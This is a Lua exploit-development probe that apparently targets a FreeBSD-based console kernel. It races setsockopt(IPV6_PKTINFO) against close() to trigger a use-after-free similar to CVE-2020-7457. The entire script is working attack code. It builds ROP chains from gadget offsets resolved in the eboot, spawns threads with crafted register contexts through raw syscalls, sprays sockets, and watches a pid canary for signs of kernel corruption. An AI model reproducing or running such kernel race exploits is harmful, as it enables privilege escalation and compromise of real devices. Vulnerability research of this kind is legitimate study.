-- CRASH_CLASS: HIGH
-- PROBE 92c: RFC 3542 IPV6_PKTINFO vs close() race
--
-- CVE-2020-7457 targeted RFC 2292 (opt 25), but the RFC 3542 path
-- (IPV6_PKTINFO=46) also modifies in6p_outputopts. If ip6_ctloutput
-- doesn't hold INP_WLOCK for RFC 3542 options either, the same UAF
-- applies: setsockopt allocates/modifies pktopts while close() frees.
--
-- Phase A: child loops setsockopt(PKTINFO=46), main closes immediately
-- Phase B: two children race set vs clear on same socket + main close
-- Phase C: child loops setsockopt(PKTINFO), second child loops close+reopen
--
-- 92b confirmed: PKTINFO=46 works (rv=0). 2292 options all blocked.
-- R10=0x060, R8=0x068 (probe 91u).

print("=== PROBE 92c: PKTINFO vs CLOSE RACE ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local mm=mk(477); local tc=mk(430); local c624=mk(624)

-- Eboot gadgets
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDX=uint64(string.format("0x%X%08X",ehi,elo+0x3B02D7))

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _R10=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local PKTINFO=46; local PV6=41

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
-- MMAP region
-- ============================================================
local NSOCK=8
local ROUNDS=20
local STK_PG=4
local PG_PER_CHILD=STK_PG+1
local MAX_CHILDREN=NSOCK*ROUNDS
local TOTAL_PG=1+MAX_CHILDREN*PG_PER_CHILD

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(TOTAL_PG*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
print(string.format("region=0x%X pages=%d children=%d", R, TOTAL_PG, MAX_CHILDREN))

-- Data page
local ts=R; wq(ts,uint64(999)); wq(ts+8,uint64(0))
local sl=R+0x20; wq(sl,uint64(0)); wq(sl+8,uint64(3000000))  -- 3ms
local tb=R+0x40

-- in6_pktinfo struct (20 bytes): in6_addr(16) + ifindex(4)
local pktinfo=R+0x80; z(pktinfo,20)

local function child_stk(i) return R+0x4000*(1+i*PG_PER_CHILD) end
local function child_ctx(i) return R+0x4000*(1+i*PG_PER_CHILD+STK_PG) end

-- ============================================================
-- Spawn: child loops setsockopt(fd, 41, 46, pktinfo, 20)
-- ============================================================
local cidx=0

local function spawn_setter(sock_fd)
    local si=cidx; cidx=cidx+1
    local stk=child_stk(si)
    local ctx=child_ctx(si)
    local stk_bytes=STK_PG*0x4000

    -- ROP: [PRDX][46][PRAX][105][SA] × N + nanosleep tail
    -- After first setsockopt (from context), RDX gets clobbered.
    -- Chain resets RDX=46 and RAX=105 each iteration.
    -- RDI=fd, RSI=41, R10=pktinfo, R8=20 survive from context.
    local off=0
    local ncycles=math.floor((stk_bytes-300)/40)
    for i=1,ncycles do
        wq(stk+off,PRDX); off=off+8
        wq(stk+off,uint64(PKTINFO)); off=off+8
        wq(stk+off,PRAX); off=off+8
        wq(stk+off,uint64(105)); off=off+8
        wq(stk+off,SA); off=off+8
    end
    -- Nanosleep tail
    for j=1,3 do
        wq(stk+off,PRSI); off=off+8; wq(stk+off,uint64(0)); off=off+8
        wq(stk+off,PRDI); off=off+8; wq(stk+off,uint64(ts)); off=off+8
        wq(stk+off,PRAX); off=off+8; wq(stk+off,uint64(240)); off=off+8
        wq(stk+off,SA); off=off+8
    end

    z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480)); wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43)); wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA); wq(ctx+_SP,uint64(stk))
    wq(ctx+_AX,uint64(105))          -- setsockopt
    wq(ctx+_DI,uint64(sock_fd))      -- fd
    wq(ctx+_SI,uint64(PV6))          -- IPPROTO_IPV6
    wq(ctx+_DX,uint64(PKTINFO))      -- IPV6_PKTINFO
    wq(ctx+_R10,uint64(pktinfo))     -- optval
    wq(ctx+_R8,uint64(20))           -- optlen

    wq(tb,uint64(0))
    pcall(function() tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return ncycles
end

-- ============================================================
-- RACE: child setsockopt loop vs main close()
-- ============================================================
print("")
print("--- PKTINFO vs CLOSE ---")

local hits=0
for round=1,ROUNDS do
    local vm0=vmc()

    -- Create sockets
    local fds={}
    for i=1,NSOCK do
        local fd=N(native.fcall_with_rax(stub,97,28,2,0))
        if fd<=0 then break end
        fds[i]=fd
    end
    if #fds<NSOCK then
        for _,fd in ipairs(fds) do native.fcall_with_rax(stub,6,fd) end
        print("R"..round..": SKIP")
        break
    end

    -- Spawn one setter per socket
    for i=1,NSOCK do spawn_setter(fds[i]) end

    -- Tiny sleep to let children enter their setsockopt loops
    native.fcall_with_rax(stub,240,sl,0)

    -- CLOSE all sockets — race trigger
    for i=1,NSOCK do native.fcall_with_rax(stub,6,fds[i]) end

    local vm1=vmc()
    local canary=N(native.fcall_with_rax(stub,20))

    print(string.format("R%02d: vm_d=%d c=%d", round, vm1-vm0, canary))
    if canary~=pid then
        print("*** CANARY MISMATCH ***")
        hits=hits+1
    end
end

-- ============================================================
-- SUMMARY
-- ============================================================
print("")
print(string.format("hits=%d children=%d", hits, cidx))
if hits>0 then
    print("*** RACE DETECTED ***")
else
    print("survived — PKTINFO path may hold INP_WLOCK or race window too tight")
end

print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 92c DONE ===")
